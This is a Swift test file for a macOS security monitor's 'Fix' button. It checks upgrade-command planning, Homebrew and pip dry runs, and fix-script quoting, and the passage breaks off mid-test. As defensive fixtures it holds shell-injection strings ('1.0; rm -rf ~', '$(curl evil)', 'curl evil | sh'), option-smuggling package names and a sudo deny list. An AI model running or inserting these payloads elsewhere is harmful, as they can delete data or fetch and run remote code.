import Foundation
import Testing
@testable import OSVAKit

// The Fix button: which findings get one, the command and script it runs, Homebrew's answer, the dry runs, the result
// files, and the re-check that closes the loop.

let home = "/Users/ana"

/// A finding whose command UpgradeCommand made from these inputs, as FindingBuilder makes them.
func fixable(_ origin: Origin, _ name: String, _ ecosystem: Ecosystem? = .npm, installed: String = "1.0.0", fixed: String? = "2.0.0",
             malicious: Bool = false, subject: Finding.Subject? = nil, component: String? = nil, id: String? = nil) -> Finding {
    let inputs = UpgradeCommand.Inputs(origin: origin, name: name, ecosystem: ecosystem, target: malicious ? nil : fixed, malicious: malicious)
    let command = UpgradeCommand.advice(inputs, home: home).command
    return Finding(id: id ?? "pkg|\(name)|\(installed)", group: malicious ? .malicious : .criticalHigh,
                   subject: subject ?? .package(ecosystem: ecosystem ?? .npm, name: name), title: name, component: component,
                   installedVersion: installed, fixedVersion: malicious ? nil : fixed, severity: .high, advisoryIDs: [], flawCount: 1,
                   exploited: false, malicious: malicious, note: nil, bigIssue: nil, origins: [origin],
                   pageURL: URL(string: "https://verificationalliance.org/")!, upgradeCommand: command, verification: .none, grade: nil,
                   commandInputs: inputs)
}

/// A Mac with these executables, and tools that answer from `outputs`.
func mac(_ executables: Set<String>, outputs: [String: CommandResult] = [:]) -> ToolEnvironment {
    ToolEnvironment(home: URL(fileURLWithPath: home), base: [:], runner: RecordedRunner(outputs: outputs), isExecutable: { executables.contains($0) })
}

let everyTool: Set<String> = ["/opt/homebrew/bin/brew", "/opt/homebrew/bin/npm", "/usr/bin/python3", "/usr/bin/gem", "/opt/homebrew/bin/yarn",
                              "/opt/homebrew/bin/cargo", "/Users/ana/.cargo/bin/cargo", "/opt/homebrew/bin/python3.13",
                              "/Library/Frameworks/Python.framework/Versions/3.13/bin/python3"]

func plan(_ f: Finding, tools: ToolEnvironment = mac(everyTool)) -> Result<FixPlan, FixPlan.Refusal> {
    FixPlan.make(for: f, tools: tools, home: home)
}

func ok(_ r: Result<FixPlan, FixPlan.Refusal>, sourceLocation: SourceLocation = #_sourceLocation) throws -> FixPlan {
    guard case let .success(p) = r else { Issue.record("no plan: \(r)", sourceLocation: sourceLocation); throw CancellationError() }
    return p
}

// MARK: - What may go into a command

@Suite struct FixSafetyTests {
    @Test("versions the server may name", arguments: ["1.30.7", "10.6p2", "v0.33.0", "1.0.0-beta.1", "2.0.0+build.5", "2026-09-25", "78.1.1",
                                                     "0.2.4", "1", "3.14.11", "1.2.3~rc1", "r3222", "4.17.21"])
    func acceptedVersion(_ v: String) { #expect(FixSafety.isSafeVersion(v)) }

    @Test("anything else is not a version", arguments: [
        "", "-1", "--version", "1..2", "1.0.", ".1", "1.0;", "1.0; rm -rf ~", "$(curl evil)", "`id`", "1 .0", "1.0\n", "1.0\nrm -rf ~",
        "1.0\r", "1.0\u{0}", "'1.0'", "\"1.0\"", "1.0|x", "1.0&", "1.0>x", "~1.0", "^1.0", ">=1.0", "1.0/../x", "1:2.0", "1!2.0", "*", "beta",
        "1.0 ", "１.０", "1.0\u{2028}", String(repeating: "1", count: 65),
    ])
    func rejectedVersion(_ v: String) { #expect(!FixSafety.isSafeVersion(v), "\(v.debugDescription)") }

    @Test("names from this Mac", arguments: ["lodash", "@types/node", "golang.org/x/net", "openssl@3", "python@3.12", "libsigc++",
                                             "guzzlehttp/guzzle", "visual-studio-code", "PyYAML", "zope.interface", "my_pkg"])
    func acceptedName(_ n: String) { #expect(FixSafety.isSafeName(n)) }

    @Test("names a tool would misread, or a shell", arguments: [
        "", "-rf", "--registry=http://evil", "-", "a b", "x;y", "x; rm -rf ~", "$(touch x)", "`id`", "x\ny", "x'y", "x\"y", "~root", "*",
        ".hidden", "_x", "=ls", "x|y", "x&y", "x>y", "x\u{0}", "naïve", String(repeating: "a", count: 215),
    ])
    func rejectedName(_ n: String) { #expect(!FixSafety.isSafeName(n), "\(n.debugDescription)") }

    @Test func printableText() {
        #expect(FixSafety.isPrintable("cd ~/'My Project' && npm install 'lodash@^4.18.1'"))
        for bad in ["a\nb", "a\rb", "a\tb", "a\u{7}b", "a\u{1B}[2Jb", "a\u{7F}b", "a\u{85}b", "a\u{2028}b"] {
            #expect(!FixSafety.isPrintable(bad), "\(bad.debugDescription)")
        }
        #expect(FixSafety.isSafePath("/Users/ana/My Project") && !FixSafety.isSafePath("relative/x") && !FixSafety.isSafePath("/a\nb"))
    }

    @Test func aServerVersionThatIsNotAVersionNeverReachesACommand() throws {
        let json = #"{"checked":1,"packages":[{"ecosystem":"npm","name":"lodash","version":"4.17.20","malicious":false,"distinct_flaws":1,"worst_severity":"HIGH","advisories":["GHSA-1"],"flaws":[{"id":"GHSA-1","severity":"HIGH","fixed_in":["4.17.21"]}],"plan":{"target":"4.17.21; touch /tmp/pwned","fixes":["GHSA-1"],"remaining":[]}}]}"#
        let response = try JSONDecoder().decode(BatchResponse.self, from: Data(json.utf8))
        let selection = PrivacyFilter(index: Fixture.index).approve([InstalledPackage(ecosystem: .npm, name: "lodash", version: "4.17.20",
                                                                                       origin: .npmGlobal(npm: "/opt/homebrew/bin/npm"))])
        let verdicts = Dictionary(uniqueKeysWithValues: selection.approved.keys.map { ($0, response.packages[0]) })
        let f = try #require(FindingBuilder(index: Fixture.index).findings(approved: selection.approved, verdicts: verdicts, brew: [], projects: [:],
                                                                           bigIssues: []).first)
        #expect(f.upgradeCommand == nil && f.commandInputs == nil && f.fixedVersion == nil)
        #expect(f.note?.contains("does not accept as a version") == true)
        #expect(plan(f) == .failure(.noCommand))
    }
}

// MARK: - Which findings get a Fix button, and what it runs

@Suite struct FixPlanTests {
    @Test func aHomebrewFormula() throws {
        let f = fixable(.homebrewFormula(name: "nginx"), "nginx", nil, installed: "1.30.2", fixed: "1.30.7",
                        subject: .project(slug: "nginx", name: "nginx", installedAs: "nginx"))
        let p = try ok(plan(f))
        #expect(p.command == "brew upgrade nginx" && p.command == f.upgradeCommand)
        #expect(p.toolPath == "/opt/homebrew/bin/brew" && p.pathFirst == "/opt/homebrew/bin" && p.place == "Homebrew in /opt/homebrew")
        #expect(p.homebrew == FixPlan.Homebrew(brew: "/opt/homebrew/bin/brew", name: "nginx", cask: false, versionIsTheFix: true, label: "nginx"))
        #expect(p.action == .upgrade && p.majorUpgrade == nil && p.lockfileNote == nil)
    }

    @Test func anElectronAppItsCaskCarries() throws {
        let f = fixable(.electronApp(name: "Slack", bundlePath: "/Applications/Slack.app", caskToken: "slack"), "electron",
                        installed: "28.1.0", fixed: "42.11.16", component: "Electron")
        let p = try ok(plan(f))
        #expect(p.command == "brew upgrade --cask slack")
        #expect(p.homebrew?.cask == true && p.homebrew?.versionIsTheFix == false && p.homebrew?.label == "Slack")
        #expect(p.majorUpgrade == nil)                                    // Electron's major is the app's business
        #expect(p.installed == "Electron 28.1.0")
    }

    /// Exactly the fixed version (`==`, not `>=`, which let pip take starlette 1.10 over 1.3.1); the plan carries what
    /// the check of its dependents needs (PythonDependentsTests).
    @Test func pipInAPythonOrgPythonAcrossAMajorVersion() throws {
        let f = fixable(.pip(python: Fixture.pythonOrg, user: true, formula: nil), "setuptools", .pypi, installed: "58.0.4", fixed: "78.1.1")
        let p = try ok(plan(f, tools: mac(everyTool.union([Fixture.pythonOrg.executable]))))
        #expect(p.command == "\(Fixture.pythonOrg.executable) -m pip install --user --upgrade setuptools==78.1.1")
        #expect(p.pip == FixPlan.Pip(python: Fixture.pythonOrg.executable, requirement: "setuptools==78.1.1", user: true, name: "setuptools",
                                     target: "78.1.1", installed: "58.0.4"))
        #expect(p.pathFirst == nil && p.place == "Python 3.13.1 (python.org), your user site")
        #expect(p.majorUpgrade == "Major version 58 → 78: check what uses setuptools afterwards.")
    }

    /// Rules C-3, B-7: Apple's Python (Xcode's, the Command Line Tools') and Apple's Ruby are accept-system: no
    /// user-level "fix", which would only hide the system copy. A malicious package in the user site can still go.
    @Test func applesPythonAndRubyAreLeftToMacOS() throws {
        for user in [false, true] {
            let r = plan(fixable(.pip(python: Fixture.applePython, user: user, formula: nil), "setuptools", .pypi, installed: "58.0.4", fixed: "78.1.1"))
            guard case let .failure(.systemComponent(why)) = r else { Issue.record("Apple's Python, user \(user): \(r)"); continue }
            #expect(why.contains(user ? "user site of Apple's Python" : "only an Xcode or macOS update"))
        }
        let removal = try ok(plan(fixable(.pip(python: Fixture.applePython, user: true, formula: nil), "evil", .pypi, malicious: true)))
        #expect(removal.invocation.arguments == ["-m", "pip", "uninstall", "-y", "evil"])
        for malicious in [false, true] {
            let r = plan(fixable(.gem(gem: "/usr/bin/gem"), "nokogiri", .rubygems, installed: "1.13.8", fixed: "1.19.5", malicious: malicious))
            guard case let .failure(.systemComponent(why)) = r else { Issue.record("Apple's Ruby: \(r)"); continue }
            #expect(why == "Part of macOS: only a macOS update changes Apple's Ruby and its gems.")
        }
    }

    @Test func gemUpgradesAreNotRunForYou() throws {
        let f = fixable(.gem(gem: "/opt/homebrew/opt/ruby/bin/gem"), "nokogiri", .rubygems, installed: "1.13.8", fixed: "1.19.5")
        let r = plan(f, tools: mac(everyTool.union(["/opt/homebrew/opt/ruby/bin/gem"])))
        guard case .failure(.sharedEnvironment) = r else { Issue.record("gem upgrade: \(r)"); return }
    }

    @Test func aProjectsLockfileUpgradeIsNotRunForYou() throws {
        let f = fixable(.folder(root: "/Users/ana/code", lockfile: "/Users/ana/code/shop/yarn.lock", direct: true), "axios", installed: "1.6.0", fixed: "1.15.0")
        guard case let .failure(.sharedEnvironment(why)) = plan(f) else { Issue.record("a lockfile upgrade was planned"); return }
        #expect(why.contains("run its tests"))
    }

    @Test func malwareGetsARemoval() throws {
        let f = fixable(.folder(root: "/Users/ana/code", lockfile: "/Users/ana/code/shop/package-lock.json", direct: true), "axios", malicious: true)
        let p = try ok(plan(f))
        #expect(p.action == .removal && p.command == "cd ~/code/shop && npm uninstall axios" && p.target == nil && p.majorUpgrade == nil)
    }

    @Test func noButtonWithoutAnExactlyReproducibleCommand() {
        var f = fixable(.homebrewFormula(name: "nginx"), "nginx", nil)
        f.commandInputs = nil                                                  // a report saved before the button existed
        #expect(plan(f) == .failure(.notReproducible))
        f = fixable(.homebrewFormula(name: "nginx"), "nginx", nil)
        f.upgradeCommand = "brew upgrade nginx; curl evil | sh"                 // a report changed on disk
        #expect(plan(f) == .failure(.notReproducible))
        f = fixable(.homebrewFormula(name: "nginx"), "nginx", nil)
        f.commandInputs?.origin = .homebrewFormula(name: "curl")                // inputs that make another command
        #expect(plan(f) == .failure(.notReproducible))
        #expect(plan(fixable(.electronApp(name: "Notion", bundlePath: "/Applications/Notion.app", caskToken: nil), "electron")) == .failure(.noCommand))
    }

    @Test func noButtonForANameAToolWouldReadAsAnOption() {
        #expect(plan(fixable(.npmGlobal(npm: "/opt/homebrew/bin/npm"), "--registry=http://evil.example")) == .failure(.unsafeName))
        #expect(plan(fixable(.npmGlobal(npm: "/opt/homebrew/bin/npm"), "-rf")) == .failure(.unsafeName))
        #expect(plan(fixable(.npmGlobal(npm: "/opt/homebrew/bin/npm"), "x$(touch /tmp/pwned)")) == .failure(.unsafeName))
        #expect(plan(fixable(.npmGlobal(npm: "/opt/homebrew/bin/npm"), "x\ntouch /tmp/pwned")) == .failure(.unsafePath))
    }

    @Test func noButtonForAVersionThatIsNotOne() {
        var f = fixable(.npmGlobal(npm: "/opt/homebrew/bin/npm"), "lodash", fixed: "4.17.21")
        f.fixedVersion = "$(id)"
        #expect(plan(f) == .failure(.unsafeVersion))
        // inputs carrying a bad version (a report written by something else): the command quotes it, the plan refuses it
        let bad = fixable(.npmGlobal(npm: "/opt/homebrew/bin/npm"), "lodash", fixed: "1.0; touch /tmp/pwned")
        #expect(plan(bad) == .failure(.unsafeVersion))
    }

    @Test func noButtonForWhatANewTerminalWindowCannotDoRight() {
        // requirements.txt: pip must run in the project's own environment
        #expect(plan(fixable(.folder(root: "/p", lockfile: "/p/requirements.txt", direct: true), "django", .pypi)) == .failure(.needsProjectEnvironment))
        // a package some formula installed: `brew upgrade` alone would upgrade everything
        #expect(plan(fixable(.pip(python: Fixture.homebrewPython, user: false, formula: ""), "six", .pypi)) == .failure(.tooBroad))
        // PEP 668: no command at all, so nothing to run (and never --break-system-packages)
        #expect(plan(fixable(.pip(python: Fixture.homebrewPython, user: false, formula: nil), "urllib3", .pypi)) == .failure(.noCommand))
    }

    @Test func onlyToolsFoundOnThisMac() {
        let none = mac([])
        #expect(plan(fixable(.homebrewFormula(name: "nginx"), "nginx", nil), tools: none) == .failure(.toolNotFound("Homebrew")))
        #expect(plan(fixable(.npmGlobal(npm: "/opt/homebrew/bin/npm"), "eslint"), tools: none) == .failure(.toolNotFound("npm")))
        #expect(plan(fixable(.folder(root: "/p", lockfile: "/p/pnpm-lock.yaml", direct: true), "x"), tools: none) == .failure(.toolNotFound("pnpm")))
        #expect(FixPlan.Refusal.toolNotFound("pnpm").explanation == "pnpm was not found on this Mac, so the app cannot run this for you.")
        #expect(FixPlan.Refusal.notReproducible.explanation == nil)
    }

    @Test func noPlanEverRunsSudoOrBreaksPEP668() throws {
        let origins: [(Origin, String, Ecosystem?)] = [
            (.homebrewFormula(name: "openssl@3"), "openssl@3", nil), (.homebrewCask(token: "firefox"), "firefox", nil),
            (.electronApp(name: "Slack", bundlePath: "/Applications/Slack.app", caskToken: "slack"), "electron", .npm),
            (.npmGlobal(npm: "/opt/homebrew/bin/npm"), "eslint", .npm), (.cargoInstall, "ripgrep", .crates), (.gem(gem: "/usr/bin/gem"), "rack", .rubygems),
            (.pip(python: Fixture.applePython, user: false, formula: nil), "six", .pypi),
            (.pip(python: Fixture.applePython, user: true, formula: nil), "six", .pypi),
            (.pip(python: Fixture.homebrewPython, user: false, formula: "jupyterlab"), "tornado", .pypi),
            (.folder(root: "/p", lockfile: "/p/package-lock.json", direct: false), "minimist", .npm),
        ]
        for (origin, name, eco) in origins {
            for malicious in [false, true] {
                guard case let .success(p) = plan(fixable(origin, name, eco, malicious: malicious)) else { continue }
                for word in ["sudo", "--break-system-packages", "doas", "su "] { #expect(!p.command.contains(word), "\(p.command)") }
            }
        }
    }

    @Test func majorVersions() {
        #expect(FixPlan.major("v2.8.0") == 2 && FixPlan.major("10.6p2") == 10 && FixPlan.major("r3222") == nil)
        #expect(FixPlan.majorUpgrade(from: "1.26.5", to: "2.8.0", name: "urllib3") != nil)
        #expect(FixPlan.majorUpgrade(from: "1.30.2", to: "1.30.7", name: "nginx") == nil)
        #expect(FixPlan.majorUpgrade(from: "v0.17.0", to: "v0.33.0", name: "x/net") == nil)
    }
}

// MARK: - Homebrew's answer

@Suite struct HomebrewAvailabilityTests {
    static let nginxInfo = #"{"formulae":[{"name":"nginx","full_name":"nginx","versions":{"stable":"1.30.6","head":"HEAD","bottle":true},"revision":0,"installed":[{"version":"1.30.2_1"}],"linked_keg":"1.30.2_1","pinned":false,"outdated":true,"deprecated":false,"disabled":false}],"casks":[]}"#
    static let slackInfo = #"{"formulae":[],"casks":[{"token":"slack","version":"4.52.0,arm64","installed":"4.51.180","outdated":true,"disabled":false}]}"#
    let formula = FixPlan.Homebrew(brew: "/opt/homebrew/bin/brew", name: "nginx", cask: false, versionIsTheFix: true, label: "nginx")
    let cask = FixPlan.Homebrew(brew: "/opt/homebrew/bin/brew", name: "slack", cask: true, versionIsTheFix: false, label: "Slack")

    @Test func readsBrewInfo() throws {
        let n = try #require(HomebrewInfo.parse(Data(Self.nginxInfo.utf8), name: "nginx", cask: false))
        #expect(n == HomebrewInfo(name: "nginx", stable: "1.30.6", installed: "1.30.2"))
        let s = try #require(HomebrewInfo.parse(Data(Self.slackInfo.utf8), name: "slack", cask: true))
        #expect(s == HomebrewInfo(name: "slack", stable: "4.52.0", installed: "4.51.180"))
        #expect(HomebrewInfo.parse(Data(Self.nginxInfo.utf8), name: "curl", cask: false) == nil)          // not the one asked about
        #expect(HomebrewInfo.parse(Data("not json".utf8), name: "nginx", cask: false) == nil)
    }

    @Test func homebrewBehindTheFixGetsNoButton() {
        let info = HomebrewInfo(name: "nginx", stable: "1.30.6", installed: "1.30.2")
        #expect(HomebrewAvailability.decide(info, for: formula, fixedVersion: "1.30.7") == .unavailable("Homebrew still ships 1.30.6; the fix is 1.30.7 upstream."))
        // the verified core's order: 10.6p1 is before 10.6p2
        let ssh = FixPlan.Homebrew(brew: "/opt/homebrew/bin/brew", name: "openssh", cask: false, versionIsTheFix: true, label: "openssh")
        #expect(HomebrewAvailability.decide(HomebrewInfo(name: "openssh", stable: "10.6p1", installed: "10.6p1"), for: ssh, fixedVersion: "10.6p2")
            == .unavailable("Homebrew still ships 10.6p1; the fix is 10.6p2 upstream."))
    }

    @Test func homebrewWithTheFixGetsOne() {
        for stable in ["1.30.7", "1.30.8", "1.31.9"] {
            #expect(HomebrewAvailability.decide(HomebrewInfo(name: "nginx", stable: stable, installed: "1.30.2"), for: formula, fixedVersion: "1.30.7")
                == .available(line: "Has \(stable)."))
        }
    }

    @Test func pinnedOrDisabled() {
        #expect(HomebrewAvailability.decide(HomebrewInfo(name: "nginx", stable: "1.30.7", installed: "1.30.2", pinned: true), for: formula, fixedVersion: "1.30.7")
            == .unavailable("nginx is pinned in Homebrew, so brew upgrade leaves it as it is. Unpin it first: brew unpin nginx."))
        if case .unavailable = HomebrewAvailability.decide(HomebrewInfo(name: "nginx", stable: "1.30.7", installed: nil, disabled: true), for: formula,
                                                           fixedVersion: "1.30.7") {} else { Issue.record("a disabled formula was offered") }
    }

    @Test func aCaskThatCarriesTheFlawNeedsANewerRelease() {
        #expect(HomebrewAvailability.decide(HomebrewInfo(name: "slack", stable: "4.52.0", installed: "4.51.180"), for: cask, fixedVersion: "42.11.16")
            == .available(line: "Has Slack 4.52.0; 4.51.180 is installed. Whether that brings the fix shows when the app checks again."))
        #expect(HomebrewAvailability.decide(HomebrewInfo(name: "slack", stable: "4.51.180", installed: "4.51.180"), for: cask, fixedVersion: "42.11.16")
            == .unavailable("Homebrew has no newer Slack than 4.51.180, the one installed."))
    }

    @Test func asksBrewLocallyWithArgvAndNoUpdate() async {
        let recorder = ArgvRecorder(output: CommandResult(status: 0, stdout: Data(Self.nginxInfo.utf8), stderr: Data()))
        let tools = ToolEnvironment(home: URL(fileURLWithPath: home), base: [:], runner: recorder, isExecutable: { _ in true })
        let a = await HomebrewInfoReader(tools: tools).availability(formula, fixedVersion: "1.30.7")
        #expect(a == .unavailable("Homebrew still ships 1.30.6; the fix is 1.30.7 upstream."))
        let call = recorder.calls.first
        #expect(call?.argv == ["/opt/homebrew/bin/brew", "info", "--json=v2", "--formula", "nginx"])
        #expect(call?.environment["HOMEBREW_NO_AUTO_UPDATE"] == "1" && call?.environment["HOMEBREW_NO_ANALYTICS"] == "1")
    }

    @Test func whenBrewDoesNotAnswerTheButtonStaysAndSaysSo() async {
        let a = await HomebrewInfoReader(tools: mac(["/opt/homebrew/bin/brew"])).availability(formula, fixedVersion: "1.30.7")
        guard case let .unknown(why) = a else { Issue.record("\(a)"); return }
        #expect(why.hasPrefix("Could not read Homebrew's data"))
    }
}

/// Records each tool invocation and answers them all the same.
final class ArgvRecorder: CommandRunner, @unchecked Sendable {
    struct Call { var argv: [String]; var environment: [String: String] }
    private let lock = NSLock()
    private var _calls: [Call] = []
    let output: CommandResult
    init(output: CommandResult) { self.output = output }
    var calls: [Call] { lock.withLock { _calls } }
    func run(_ executable: String, _ arguments: [String], environment: [String: String], timeout: TimeInterval) async throws -> CommandResult {
        lock.withLock { _calls.append(Call(argv: [executable] + arguments, environment: environment)) }
        return output
    }
}

// MARK: - Dry runs

@Suite struct FixPreviewTests {
    @Test func brewDryRun() {
        let text = """
        ==> Downloading Homebrew API data
        ==> Would upgrade 2 outdated packages:
        openssl@3 3.6.1 -> 3.6.2
        nginx 1.30.2 -> 1.30.7
        ==> Would upgrade 1 dependent of upgraded formulae:
        curl   8.17.0 -> 8.17.0_1
        Warning: something else 1.0 already installed
        """
        #expect(FixPreviewer.parseBrewDryRun(text) == ["Would upgrade 2 outdated packages:", "openssl@3 3.6.1 → 3.6.2", "nginx 1.30.2 → 1.30.7",
                                                       "Would upgrade 1 dependent of upgraded formulae:", "curl 8.17.0 → 8.17.0_1",
                                                       "something else 1.0 already installed"])
        #expect(FixPreviewer.parseBrewDryRun("Warning: nginx 1.30.7 already installed\n") == ["nginx 1.30.7 already installed"])
    }

    @Test func pipDryRun() {
        #expect(FixPreviewer.parsePipDryRun("Collecting urllib3\nWould install idna-3.10 urllib3-2.8.0 typing-extensions-4.12.2\n")
            == ["Would install idna 3.10, urllib3 2.8.0, typing-extensions 4.12.2"])
        #expect(FixPreviewer.pipVersion("pip 24.0 from /x/site-packages/pip (python 3.12)\n") == "24.0")
        #expect(FixPreviewer.pipVersion("pip $(id) from x") == nil)
    }

    @Test func brewAskedWithArgvAndDryRun() async throws {
        let recorder = ArgvRecorder(output: CommandResult(status: 0, stdout: Data("==> Would upgrade 1 outdated package:\nnginx 1.30.2 -> 1.30.7\n".utf8), stderr: Data()))
        let tools = ToolEnvironment(home: URL(fileURLWithPath: home), base: [:], runner: recorder, isExecutable: { _ in true })
        let p = try ok(plan(fixable(.homebrewFormula(name: "nginx"), "nginx", nil, installed: "1.30.2", fixed: "1.30.7"), tools: tools))
        let preview = await FixPreviewer(tools: tools).preview(p)
        #expect(preview.lines == ["Would upgrade 1 outdated package:", "nginx 1.30.2 → 1.30.7"] && preview.source == "brew upgrade --dry-run")
        #expect(recorder.calls.map(\.argv) == [["/opt/homebrew/bin/brew", "upgrade", "--dry-run", "nginx"]])
    }

    @Test func pipWithoutADryRunSaysSo() async throws {
        let py = Fixture.pythonOrg.executable
        let tools = mac(everyTool.union([py]), outputs: ["\(py) -m pip --version": CommandResult(status: 0, stdout: Data("pip 21.2.4 from /x (python 3.13)\n".utf8), stderr: Data())])
        let p = try ok(plan(fixable(.pip(python: Fixture.pythonOrg, user: false, formula: nil), "six", .pypi), tools: tools))
        let preview = await FixPreviewer(tools: tools).preview(p)
        #expect(preview.unavailable == "This pip (21.2.4) has no dry run: pip 22.2 added it." && preview.lines.isEmpty)
    }

    @Test func pipsDryRunNeverBuildsFromSource() async throws {
        let recorder = ArgvRecorder(output: CommandResult(status: 0, stdout: Data("pip 24.0 from /x (python 3.13)\nWould install six-1.17.0\n".utf8), stderr: Data()))
        let tools = ToolEnvironment(home: URL(fileURLWithPath: home), base: [:], runner: recorder, isExecutable: { _ in true })
        let python = PythonEnvironment(executable: "/opt/homebrew/bin/python3.13", version: "3.13.1", kind: .virtualEnv, externallyManaged: false,
                                       userSite: nil, formula: nil)
        let p = try ok(plan(fixable(.pip(python: python, user: false, formula: nil), "six", .pypi, fixed: "1.17.0"), tools: tools))
        _ = await FixPreviewer(tools: tools).preview(p)
        #expect(recorder.calls.last?.argv == ["/opt/homebrew/bin/python3.13", "-m", "pip", "install", "--dry-run", "--only-binary=:all:", "--upgrade",
                                              "--disable-pip-version-check", "--no-input", "six==1.17.0"])
    }

    @Test func otherToolsHaveNone() async throws {
        let p = try ok(plan(fixable(.npmGlobal(npm: "/opt/homebrew/bin/npm"), "eslint")))
        #expect(await FixPreviewer(tools: mac(everyTool)).preview(p).unavailable == "npm has no dry run the app uses: the log shows what changes.")
    }
}

// MARK: - The script

/// Runs a fix script as Terminal would, but without a terminal and without waiting for a key.
func runScript(_ url: URL, path: String = "/usr/bin:/bin") throws -> (status: Int32, output: String) {
    let p = Process()
    p.executableURL = url
    p.environment = ["PATH": path, FixScript.noWaitVariable: "1", "HOME": NSTemporaryDirectory()]
    let out = Pipe()
    p.standardOutput = out; p.standardError = out; p.standardInput = FileHandle.nullDevice
    try p.run()
    let data = out.fileHandleForReading.readDataToEndOfFile()
    p.waitUntilExit()
    return (p.terminationStatus, String(decoding: data, as: UTF8.self))
}

/// A plan as FixPlan makes them, for any command (the script's tests run harmless ones).
func scriptPlan(_ command: String, id: String = "pkg|npm|left-pad|1.0.0", title: String = "left-pad", pathFirst: String? = nil) -> FixPlan {
    FixPlan(findingID: id, title: title, command: command, invocation: FixInvocation(executable: "/bin/echo", arguments: []), action: .upgrade,
            toolPath: "/bin/echo", toolName: "echo", place: "here", inProjectFolder: false, installed: "1.0.0", target: "2.0.0", pathFirst: pathFirst)
}

@Suite struct FixScriptTests {
    @Test func theScriptRunsTheShownCommandAndLeavesItsResult() throws {
        let dirs = FixDirectories(support: temporaryDirectory())
        let run = UUID()
        let plan = scriptPlan("echo 'fixing left-pad'")
        let url = try FixScript.write(plan, run: run, directories: dirs)
        let text = try String(contentsOf: url, encoding: .utf8)
        #expect(text.hasPrefix("#!/bin/zsh -f\n"))
        #expect(text.components(separatedBy: "\n").contains(plan.command))         // the command line is the shown one, as is

        let (status, output) = try runScript(url)
        #expect(status == 0)
        #expect(output.contains("OSVA Monitor is upgrading left-pad. It runs:\n  echo 'fixing left-pad'\n\nfixing left-pad\n"))
        #expect(output.contains("Done. OSVA Monitor is checking left-pad again."))
        #expect(!FileManager.default.fileExists(atPath: url.path))                  // it deleted itself
        let results = FixResults.collect(in: dirs.results, pending: [run: plan.findingID])
        #expect(results == [FixResult(run: run, findingID: plan.findingID, status: 0)])
        #expect((try FileManager.default.contentsOfDirectory(atPath: dirs.results.path)).isEmpty)   // taken, and removed
        #expect(text.contains("\numask 077\n"))                                       // what it writes is this user's alone
    }

    @Test func aFailureIsRecordedWithItsStatus() throws {
        let dirs = FixDirectories(support: temporaryDirectory())
        let run = UUID()
        let url = try FixScript.write(scriptPlan("/bin/sh -c 'exit 3'"), run: run, directories: dirs)
        let (status, output) = try runScript(url)
        #expect(status == 0)
        #expect(output.contains("The command failed (exit status 3). OSVA Monitor is checking left-pad again."))
        #expect(FixResults.collect(in: dirs.results, pending: [run: "pkg|npm|left-pad|1.0.0"]).map(\.status) == [3])
    }

    @Test func scriptsAndResultsArePrivate() throws {
        let dirs = FixDirectories(support: temporaryDirectory())
        let url = try FixScript.write(scriptPlan("true"), run: UUID(), directories: dirs)
        func mode(_ p: String) -> Int { ((try? FileManager.default.attributesOfItem(atPath: p))?[.posixPermissions] as? Int) ?? -1 }
        #expect(mode(url.path) == 0o700 && mode(dirs.scripts.path) == 0o700 && mode(dirs.results.path) == 0o700)
        #expect(url.deletingLastPathComponent().path == dirs.scripts.path && url.pathExtension == "command")
    }

    @Test func aScriptIsNeverWrittenOverAnotherFileOrThroughALink() throws {
        let dirs = FixDirectories(support: temporaryDirectory())
        let run = UUID()
        try dirs.prepare()
        let target = temporaryDirectory().appendingPathComponent("elsewhere")
        try symlink(target.path, dirs.scripts.appendingPathComponent("fix-\(run.uuidString).command").path).isZero(or: "symlink")
        #expect(throws: FixScriptError.self) { try FixScript.write(scriptPlan("true"), run: run, directories: dirs) }
        #expect(!FileManager.default.fileExists(atPath: target.path))
        // and a results folder that is a link elsewhere is refused
        let support = temporaryDirectory()
        try symlink(temporaryDirectory().path, support.appendingPathComponent("fix-results").path).isZero(or: "symlink")
        #expect(throws: FixScriptError.self) { try FixDirectories(support: support).prepare() }
    }

    /// The names, versions and paths an attacker would choose. Each must reach the tool as exactly one argument, and
    /// nothing in it may run: the canary file must never appear.
    static func hostile(_ canary: String) -> [String] {
        ["x; touch \(canary)", "$(touch \(canary))", "`touch \(canary)`", "x\ntouch \(canary)", "x'; touch \(canary); echo '", "x\"; touch \(canary); \"",
         "-rf", "--registry=http://evil.example", "=touch", "*", "~root", "${HOME}", "x|touch \(canary)", "x && touch \(canary)", "!!", "x\\", "\\'"]
    }

    @Test func noHostileNameVersionOrPathEscapesTheScriptsQuoting() throws {
        let base = temporaryDirectory()
        let canary = base.appendingPathComponent("canary").path
        // stand-ins for the tools, first on PATH: each writes the arguments it got, one per NUL
        let bin = base.appendingPathComponent("bin", isDirectory: true)
        let argvFile = base.appendingPathComponent("argv")
        try FileManager.default.createDirectory(at: bin, withIntermediateDirectories: true)
        let recorder = "#!/bin/sh\nfor a in \"$@\"; do printf '%s\\0' \"$a\"; done > '\(argvFile.path)'\n"
        for tool in ["npm", "brew", "gem", "cargo", "python3"] {
            let t = bin.appendingPathComponent(tool)
            try Data(recorder.utf8).write(to: t)
            chmod(t.path, 0o755)
        }
        let python = PythonEnvironment(executable: bin.appendingPathComponent("python3").path, version: "3.13.1", kind: .virtualEnv,
                                       externallyManaged: false, userSite: nil, formula: nil)
        var checked = 0
        for evil in Self.hostile(canary) {
            // (origin, name, target) -> the arguments the tool must receive
            let cases: [(Origin, String, String?, [String])] = [
                (.npmGlobal(npm: "/opt/homebrew/bin/npm"), evil, "2.0.0", ["install", "-g", evil + "@2.0.0"]),
                (.npmGlobal(npm: "/opt/homebrew/bin/npm"), "lodash", evil, ["install", "-g", "lodash@" + evil]),
                (.pip(python: python, user: false, formula: nil), evil, "2.0.0", ["-m", "pip", "install", "--upgrade", evil + "==2.0.0"]),
                (.pip(python: python, user: false, formula: nil), "six", evil, ["-m", "pip", "install", "--upgrade", "six==" + evil]),
                (.homebrewFormula(name: evil), evil, nil, ["upgrade", evil]),
                (.homebrewCask(token: evil), evil, nil, ["upgrade", "--cask", evil]),
                (.cargoInstall, evil, "2.0.0", ["install", evil + "@2.0.0"]),
            ]
            for (origin, name, target, expected) in cases where !expected.isEmpty {
                let inputs = UpgradeCommand.Inputs(origin: origin, name: name, ecosystem: nil, target: target, malicious: false)
                let command = try #require(UpgradeCommand.advice(inputs, home: home).command)
                let id = "pkg|x|\(evil)|1.0"
                let run = UUID()
                let dirs = FixDirectories(support: base.appendingPathComponent(run.uuidString))
                let url = try FixScript.write(scriptPlan(command, id: id, title: evil, pathFirst: bin.path), run: run, directories: dirs)
                try? FileManager.default.removeItem(at: argvFile)
                let (_, output) = try runScript(url)
